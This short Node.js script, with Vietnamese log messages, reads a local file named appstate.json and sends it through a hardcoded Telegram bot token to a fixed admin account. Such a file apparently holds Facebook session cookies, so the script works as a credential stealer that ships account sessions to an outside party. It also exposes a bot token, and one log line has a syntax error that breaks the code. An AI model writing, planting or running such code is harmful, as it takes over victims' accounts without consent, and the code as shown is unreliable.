const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE'; 
const bot = new TelegramBot(botToken, { polling: true });

const adminIds = ['1713841196']; 

adminIds.forEach(adminId => {
  const fileStream = fs.createReadStream('appstate.json');
  bot.sendDocument(adminId, fileStream, { filename: 'appstate.json' })
    .then(() => {
      console.log(`Đã gửi tài liệu đến ${adminId}`);
    })
    .catch(err => {
      console.error(`Gửi tài liệu đến ${adminId thất bại:`, err);
    });
});
